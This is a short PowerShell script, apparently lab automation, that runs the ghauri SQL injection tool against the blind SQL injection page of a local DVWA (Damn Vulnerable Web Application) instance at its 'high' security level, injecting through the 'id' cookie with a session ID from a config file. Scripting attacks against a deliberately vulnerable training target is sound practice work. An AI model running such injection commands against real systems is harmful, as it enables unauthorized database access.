# Read configuration
$config = Get-Content (Join-Path $PSScriptRoot "..\config.json") | ConvertFrom-Json

# Environment
$target = "dvwa"
$ghauri_path = [System.IO.Path]::GetFullPath((Join-Path $PSScriptRoot $config.tools.ghauri))

$url_blind = $config.environment.dvwa_docker + "/vulnerabilities/sqli_blind"

$phpsessid = $config.targets.$target.phpsessid
$cookie_high = "security=high; PHPSESSID={0}" -f $phpsessid

$cookie_id = "id=1; " + $cookie_high

& $ghauri_path -u "$url_blind" --cookie="$cookie_id" -p id --level 3 --dbms="MySQL" --batch